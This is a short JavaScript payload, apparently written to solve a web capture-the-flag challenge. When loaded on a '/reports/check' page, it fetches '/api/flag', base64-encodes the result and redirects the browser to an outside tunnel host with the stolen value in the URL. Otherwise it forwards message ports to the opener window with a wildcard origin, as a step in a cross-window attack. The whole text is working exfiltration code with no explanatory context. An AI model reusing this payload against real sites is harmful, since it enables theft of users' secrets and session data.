let q=new URLSearchParams(location.search),i=q.get('rid'),R='/reports/check?rid='+i,C=location.port==3001?'http://127.0.0.1:8000':'https://supported-conversation-inter-consoles.trycloudflare.com';
if(location.pathname=='/reports/check')fetch('/api/flag').then(x=>x.text()).then(x=>location=C+'/flag?x='+btoa(x));
else onmessage=e=>{if(e.ports[0])parent.opener.postMessage(0,'*',e.ports)};
